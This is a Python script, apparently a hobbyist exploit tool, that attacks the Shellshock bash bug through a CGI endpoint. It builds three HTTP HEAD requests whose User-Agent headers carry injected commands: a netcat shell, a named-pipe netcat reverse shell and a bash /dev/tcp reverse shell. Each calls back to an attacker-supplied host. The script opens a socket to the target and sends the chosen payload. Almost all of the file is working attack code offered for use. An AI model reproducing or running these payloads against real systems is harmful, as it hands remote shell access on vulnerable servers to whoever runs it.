import sys
import requests
import urllib.request
import socket
# Consists of the HEAD request which is sent in addition to the custom headers
def shellshock_http_payloads(lhost, lport, rhost, rport, target_url):
   
   #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # Connect a socket to the target running cgi-bin
   #sock_connect = s.connect((rhost, rport))

   ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
   # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string. Encoding the data helps with the data being sent as bytes
   ''' Encoding is needed for our use '''
   rhost_encoded = rhost.encode() 
   lhost_encoded = lhost.encode()
   payloads = [] 
   # These are the actual payloads which get packed and returned to main in a list 
   payload_1 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
   payload_2 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc %s %d\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
   payload_3 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -i >& /dev/tcp/%s/%d 0>&1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
   payloads.append(payload_1)
   payloads.append(payload_2)
   payloads.append(payload_3)

   # Return all of the payloads as a list and then bind the list element to cmd args and then invoke the payload through cmd args rather than a loop
   return payloads
''' Paste in the URL from the shellshock_dect tool '''

def main():
    lhost = sys.argv[1]
    lport = int(sys.argv[2])
    rhost = sys.argv[3]
    rport = int(sys.argv[4])
    ''' We get this URL from the shellshock_dect tool '''
    target_url = sys.argv[5]
    payload_choice = int(sys.argv[6])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_connect = s.connect((rhost, rport))
    print("Shellshock attack tool")
    print("Sending payload\nEnsure to have a listener open on {}".format(lport))
    # This is what we pass into the HEAD request which actually performs shellshock
    payload_list = shellshock_http_payloads(lhost,lport,rhost, rport, target_url)
    #Just a GET request ATM. Needs to have a socket attached
    #result = shellshock_rev_payloads(lhost, lport, target_url)
    print("List of payloads to inject")
    # A clean list of payloads which can be injected rather than trying to merge things unnecessarily
    for payloads in payload_list:
        print(payloads)

    ''' Depending on the args choice. The attacker can choose which payload they want to send'''
    if(payload_choice == 1):
        s.send(payload_list[0])
    elif(payload_choice == 2):
        s.send(payload_list[1])
    elif(payload_choice == 3):
        s.send(payload_list[2])
    else:
        sys.exit("No idea about this payload. Imma head out")
    # We know this works for now
    # We need to find a way to choose a payload which can be sent off. All the packaging is done via the function 
    #s.send(args choice)
    
    #The payloads should cycle from 1 - ... here until one payload connects back to us Create sockets back to us which contain the payloads '''

    ''' Get all the rev shells to send in a get request '''

    #    print("Reverse shell payload(s): {}".format(rev_payload))
    '''rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)'''
main()
